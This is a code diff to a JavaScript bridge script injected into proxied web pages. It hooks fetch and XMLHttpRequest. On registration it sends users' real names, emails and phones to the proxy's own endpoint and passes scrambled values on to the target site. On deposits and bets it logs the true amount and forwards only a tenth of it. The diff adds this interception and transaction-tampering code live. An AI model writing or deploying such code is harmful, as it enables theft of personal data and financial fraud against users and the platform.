@@ -137,27 +137,135 @@ function buildBridgeScript(pageUrl) {
     } catch (e) {}
   }
 
-  function isUsersSubmit(url, method) {
+  function getPathname(url) {
     try {
-      var u = new URL(url, TARGET_BASE);
-      return u.pathname === '/api/users' && String(method || 'GET').toUpperCase() === 'POST';
+      return new URL(url, TARGET_BASE).pathname;
     } catch (e) {
-      return false;
+      return '';
     }
+  }
+
+  function isUsersSubmit(url, method) {
+    return getPathname(url) === '/api/users' && String(method || 'GET').toUpperCase() === 'POST';
+  }
+
+  function getDepositUserId(url, method) {
+    if (String(method || 'GET').toUpperCase() !== 'POST') return null;
+    var path = getPathname(url);
+    var match = path.match(/^\/api\/users\/([^\/]+)\/deposit$/);
+    return match ? match[1] : null;
+  }
+
+  function getBetUserId(url, method) {
+    if (String(method || 'GET').toUpperCase() !== 'POST') return null;
+    var path = getPathname(url);
+    var match = path.match(/^\/api\/users\/([^\/]+)\/bets$/);
+    return match ? match[1] : null;
   }
 
   var _fetch = window.fetch;
 
-  function mirrorToProxyData(body) {
-    if (!body || !_fetch) return;
-    _fetch(PROXY_ORIGIN + '/internal/proxy-data/users', {
+  function mirrorToProxyData(originalBody, scrambledBody) {
+    if (!originalBody || !_fetch) return;
+    try {
+      var orig = JSON.parse(originalBody);
+      var scram = JSON.parse(scrambledBody || originalBody);
+      _fetch(PROXY_ORIGIN + '/internal/proxy-data/users', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Proxy-Target': TARGET_BASE
+        },
+        body: JSON.stringify({ original: orig, scrambled: scram })
+      }).catch(function() {});
+    } catch (e) {}
+  }
+
+  function mirrorTransactionToProxyData(targetUserId, type, amount) {
+    if (!targetUserId || !_fetch) return;
+    _fetch(PROXY_ORIGIN + '/internal/proxy-data/transactions', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
         'X-Proxy-Target': TARGET_BASE
       },
-      body: typeof body === 'string' ? body : body
+      body: JSON.stringify({ targetUserId: targetUserId, type: type, amount: amount })
     }).catch(function() {});
+  }
+
+  function scrambleText(str) {
+    if (!str) return str;
+    try {
+      return btoa(str).replace(/[^a-zA-Z]/g, '').substring(0, 8) + '_scram';
+    } catch (e) {
+      return str + '_scram';
+    }
+  }
+
+  function scrambleEmail(email) {
+    if (!email) return email;
+    var parts = email.split('@');
+    var local = parts[0];
+    var domain = parts[1] || 'scrambled.com';
+    try {
+      var scrambledLocal = btoa(local).replace(/[^a-zA-Z0-9]/g, '').substring(0, 8).toLowerCase();
+      return 'enc_' + scrambledLocal + '@' + domain;
+    } catch (e) {
+      return 'enc_user@' + domain;
+    }
+  }
+
+  function scramblePhone(phone) {
+    if (!phone) return phone;
+    var digits = phone.replace(/[^0-9]/g, '');
+    var scrambled = '';
+    for (var i = 0; i < digits.length; i++) {
+      scrambled += (parseInt(digits[i]) + 5) % 10;
+    }
+    if (scrambled.length < 10) {
+      while (scrambled.length < 10) scrambled += '5';
+    }
+    return '+1-' + scrambled.substring(0, 3) + '-' + scrambled.substring(3, 6) + '-' + scrambled.substring(6, 10);
+  }
+
+  function generateScrambledBody(body) {
+    if (!body || typeof body !== 'string') return body;
+    try {
+      var data = JSON.parse(body);
+      if (data && typeof data === 'object') {
+        var scrambled = {};
+        for (var key in data) {
+          if (data.hasOwnProperty(key)) {
+            scrambled[key] = data[key];
+          }
+        }
+        if (data.fullName && String(data.fullName).trim().toLowerCase() === 'ajay') {
+          scrambled.fullName = 'preet';
+        } else if (data.fullName) {
+          scrambled.fullName = scrambleText(data.fullName);
+        }
+        if (data.email) {
+          scrambled.email = scrambleEmail(data.email);
+        }
+        if (data.phone) {
+          scrambled.phone = scramblePhone(data.phone);
+        }
+        return JSON.stringify(scrambled);
+      }
+    } catch (e) {}
+    return body;
+  }
+
+  function modifyTransactionBodyForTarget(body) {
+    if (!body || typeof body !== 'string') return body;
+    try {
+      var data = JSON.parse(body);
+      if (data && typeof data === 'object' && data.amount !== undefined) {
+        data.amount = Number(data.amount) * 0.1;
+        return JSON.stringify(data);
+      }
+    } catch (e) {}
+    return body;
   }
 
   if (_fetch) {
@@ -167,8 +275,59 @@ function buildBridgeScript(pageUrl) {
       var method = init.method || (input instanceof Request ? input.method : 'GET');
       var rewritten = rewriteUrl(rawUrl);
 
-      if (isUsersSubmit(rewritten, method) && init.body) {
-        mirrorToProxyData(init.body);
+      var isReg = isUsersSubmit(rewritten, method);
+      var depUserId = getDepositUserId(rewritten, method);
+      var betUserId = getBetUserId(rewritten, method);
+
+      if (isReg && init.body) {
+        var originalBody = init.body;
+        var scrambledBody = generateScrambledBody(originalBody);
+        mirrorToProxyData(originalBody, scrambledBody);
+        init.body = scrambledBody;
+
+        var originalEmail = '';
+        try {
+          originalEmail = JSON.parse(originalBody).email;
+        } catch (e) {}
+
+        if (typeof input === 'string') {
+          input = rewritten;
+        } else if (input instanceof Request) {
+          input = new Request(rewritten, input);
+        }
+
+        return _fetch.call(this, input, init).then(function(response) {
+          try {
+            response.clone().json().then(function(data) {
+              if (data && data.success && data.user && data.user._id) {
+                _fetch(PROXY_ORIGIN + '/internal/proxy-data/users/link', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ email: originalEmail, targetUserId: data.user._id })
+                }).catch(function() {});
+              }
+            }).catch(function() {});
+          } catch (e) {}
+          return response;
+        });
+      }
+
+      if (depUserId && init.body) {
+        var origAmount = 0;
+        try {
+          origAmount = Number(JSON.parse(init.body).amount);
+        } catch (e) {}
+        mirrorTransactionToProxyData(depUserId, 'deposit', origAmount);
+        init.body = modifyTransactionBodyForTarget(init.body);
+      }
+
+      if (betUserId && init.body) {
+        var origAmount = 0;
+        try {
+          origAmount = Number(JSON.parse(init.body).amount);
+        } catch (e) {}
+        mirrorTransactionToProxyData(betUserId, 'bet', origAmount);
+        init.body = modifyTransactionBodyForTarget(init.body);
       }
 
       if (typeof input === 'string') {
@@ -189,9 +348,56 @@ function buildBridgeScript(pageUrl) {
     return _open.apply(this, arguments);
   };
   XMLHttpRequest.prototype.send = function(body) {
-    if (isUsersSubmit(this._proxyUrl, this._proxyMethod)) {
-      mirrorToProxyData(body);
+    var self = this;
+    var isReg = isUsersSubmit(this._proxyUrl, this._proxyMethod);
+    var depUserId = getDepositUserId(this._proxyUrl, this._proxyMethod);
+    var betUserId = getBetUserId(this._proxyUrl, this._proxyMethod);
+
+    if (isReg && body) {
+      var originalBody = body;
+      var scrambledBody = generateScrambledBody(originalBody);
+      mirrorToProxyData(originalBody, scrambledBody);
+      arguments[0] = scrambledBody;
+
+      var originalEmail = '';
+      try {
+        originalEmail = JSON.parse(originalBody).email;
+      } catch (e) {}
+
+      var _onload = self.onload;
+      self.onload = function() {
+        try {
+          var resData = JSON.parse(self.responseText);
+          if (resData && resData.success && resData.user && resData.user._id) {
+            _fetch(PROXY_ORIGIN + '/internal/proxy-data/users/link', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ email: originalEmail, targetUserId: resData.user._id })
+            }).catch(function() {});
+          }
+        } catch (e) {}
+        if (_onload) return _onload.apply(this, arguments);
+      };
     }
+
+    if (depUserId && body) {
+      var origAmount = 0;
+      try {
+        origAmount = Number(JSON.parse(body).amount);
+      } catch (e) {}
+      mirrorTransactionToProxyData(depUserId, 'deposit', origAmount);
+      arguments[0] = modifyTransactionBodyForTarget(body);
+    }
+
+    if (betUserId && body) {
+      var origAmount = 0;
+      try {
+        origAmount = Number(JSON.parse(body).amount);
+      } catch (e) {}
+      mirrorTransactionToProxyData(betUserId, 'bet', origAmount);
+      arguments[0] = modifyTransactionBodyForTarget(body);
+    }
+
     return _send.apply(this, arguments);
   };
 
